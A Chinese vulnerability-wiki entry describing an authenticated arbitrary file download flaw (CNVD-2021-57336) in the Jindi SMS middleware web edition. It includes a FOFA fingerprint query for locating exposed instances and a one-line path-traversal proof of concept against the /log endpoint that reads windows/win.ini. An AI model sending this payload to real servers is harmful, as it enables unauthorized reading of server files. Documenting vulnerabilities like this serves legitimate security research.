---
title: "金笛 短信中间件Web版 log 后台任意文件下载漏洞 CNVD-2021-57336"
date: 2026-10-16 09:11:42
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "金笛-短信中间件Web版-log"
tags:
  - "金笛-短信中间件Web版-log"
  - "任意文件下载"
  - "CNVD-2021-57336"
  - "漏洞复现"
---
## 漏洞描述

金笛 短信中间件Web版后台存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器任意文件信息

## 漏洞影响

```
金笛 短信中间件Web版
```

## 网络测绘

```
app="金笛短信中间件(WEB版)"
```

## 漏洞复现

登录页面

![image-20220525150803211](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251508287.png)

存在漏洞的位置为 日志下载

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251508351.png)

验证POC

```
/log?action=view&pageIndex=1&name=../../../windows/win.ini
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251508651.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6Web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-CNVD-2021-57336.md)
